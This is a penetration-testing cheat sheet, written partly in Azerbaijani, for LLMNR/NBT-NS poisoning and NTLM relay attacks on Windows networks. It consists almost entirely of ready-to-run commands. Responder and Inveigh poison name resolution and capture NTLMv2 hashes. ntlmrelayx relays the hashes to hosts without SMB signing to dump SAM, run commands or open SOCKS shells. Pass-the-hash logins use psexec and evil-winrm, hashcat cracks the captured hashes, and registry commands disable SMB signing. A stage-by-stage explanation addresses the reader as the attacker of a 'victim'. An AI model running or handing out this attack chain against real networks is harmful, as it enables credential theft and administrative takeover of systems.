# LLMNR (Link-Local Multicast Name Resolution) #UDP 5355 / NBT-NS ( NetBIOS Name Service ) #UDP 137

## Enumeration
```
NMAP
nmap -sU --script nbstat.nse -p137 <target-ip-range>

RESPONDER
sudo responder -I eth0 -A ( Analyze Mode )

WIRESHARK
llmnr || nbns
udp.port == 5355 (LLMNR)
udp.port == 137 (NetBIOS Name Service)
```

## SMB-Signing Enumeration
```
nmap -p 445 --script smb2-security-mode 192.168.0.0/24

crackmapexec smb 192.168.0.0/24
nxc smb 192.168.0.0/24


## SMB-Signing disabled:
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" -Name "requiresecuritysignature" -Value 0
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" -Name "enablesecuritysignature" -Value 0

CMD: net stop lanmanserver && net start lanmanserver

```

## Exploitation
```
Target Triggering:
\\<RESPONDER-IP>\Shared
Triggering: Qurbanın özünün səhv yazmasını gözləmək istəmirsənsə, WPAD (Web Proxy Auto-Discovery) hücumunu da Responder-də aktiv saxla (-w parametri ilə). Bu, brauzer açılan kimi avtomatik sorğu yarada bilər.

## Responder 
sudo responder -I eth0 -rdwv -F
tail -f /usr/share/responder/logs/SMB-NTLMv2-*.txt

## Inveigh
Import-Module .\Inveigh.ps1
Invoke-Inveigh -ConsoleOutput Y -NBNS Y -LLMNR Y -mDNS Y
Invoke-Inveigh -ConsoleOutput Y -NBNS Y -LLMNR Y -mDNS Y -FileUpload L -IP <SPECIAL-IP> -Unique

## NTLMRELAYX
Terminal 1: 192.168.1.40 dan gələn NTLM Hash ilə 192.168.1.50 hostuna NTLM Relay edir ( Self-Relay mümkün deyil )
/etc/responder/Responder.conf --> SMB = Off / HTTP = Off

python3 ntlmrelayx.py -t 192.168.1.50 -smb2support ( SAM DUMP )
impacket-psexec -hashes :NTHash administrator@192.168.1.50
evil-winrm -i 192.168.1.50 -u administrator -H NTHash

python3 ntlmrelayx.py -t 192.168.1.50 -smb2support -c "whoami /all" ( EXECUTE COMMAND )

nxc smb 192.168.0.0/24 --gen-relay-list targets.txt
impacket-ntlmrelayx -tf targets.txt -smb2support


### Proxychains vasitəsilə daxil olmaq:
python3 ntlmrelayx.py -t 192.168.1.50 -smb2support -socks ( INTERACTIVE SHELL )
proxychains smbclient //target-ip/C$ -U domain/user

Terminal 2:
sudo responder -I eth0 -dwv -F
```

# Hash Cracking
```
hashcat -m 5600 captured.hash /usr/share/wordlists/rockyou.txt
# və ya
john --wordlist=rockyou.txt --format=netntlmv2 captured.hash
```

# Explain this Process
## Mərhələ 1: Şəbəkədə Dinləmə və Zəhərləmə (Poisoning)
```
Hücumun başlanğıc nöqtəsi qurbanın şəbəkədə yolunu azmasını gözləməkdir.

Alət: Responder

Nə baş verir: Sən şəbəkədə LLMNR, NBT-NS və MDNS protokollarını dinləyirsən. Qurban mövcud olmayan bir şəbəkə qovluğuna (məsələn: \\fayl-server1) müraciət etdikdə, Responder ona "Həmin server mənəm!" cavabını verir.

Nəticə: Qurban sənə güvənir və sənin qurduğun saxta SMB/HTTP serverinə autentifikasiya sorğusu (Hash) göndərir.
```

## Mərhələ 2: Analiz və Enumeration
```
Hər şeyi kor-koranə etməmək üçün şəbəkənin təhlükəsizlik vəziyyətini yoxlayırsan.

Alət: CrackMapExec (CME) və ya Nmap

Nə baş verir: Sən subnet-dəki maşınlarda SMB Signing statusunu yoxlayırsan.

Nəticə: Öyrənirsən ki, relay hücumu üçün sənə Signing: False olan maşınlar lazımdır. Əgər hamısında True-dursa, ya bu müdafiəni laboratoriyada söndürməli, ya da "Cross-protocol relay" (SMB to LDAP) sınaqdan keçirməlisən.
```

## Mərhələ 3: Relay (Ötürmə) Hücumu
```
Bu mərhələdə sən sadəcə bir "poçtalyon" rolunu oynayırsan.

Alət: impacket-ntlmrelayx

Nə baş verir: 1. Responder-də SMB və HTTP serverlərini bağlayırsan ki, portlar boşalsın.
2. ntlmrelayx-i işə salıb hədəf IP-ni göstərirsən.
3. Qurban sənə (Responder-ə) hash göndərdiyi an, ntlmrelayx həmin hash-i tutub dərhal hədəf maşına ötürür.

Kritik Qayda: Self-relay işləmir. Hash-i gəldiyi maşına geri göndərə bilməzsən, mütləq başqa bir hədəf seçməlisən.

Mərhələ 4: Post-Exploitation (Sızma Sonrası)
Əgər relay uğurlu olsa (SUCCEEDED), artıq hədəf maşında Administrator hüquqları ilə hərəkət edirsən.

Nə baş verir:

SAM Dump: Hədəf maşındakı bütün lokal istifadəçilərin hash-lərini çəkirsən.

Interactive Shell: Maşına daxil olub komandalar icra edirsən.

SOCKS Proxy: Hədəf maşını bir tramplin kimi istifadə edərək şəbəkənin daha dərinliklərinə sızırsan.
```

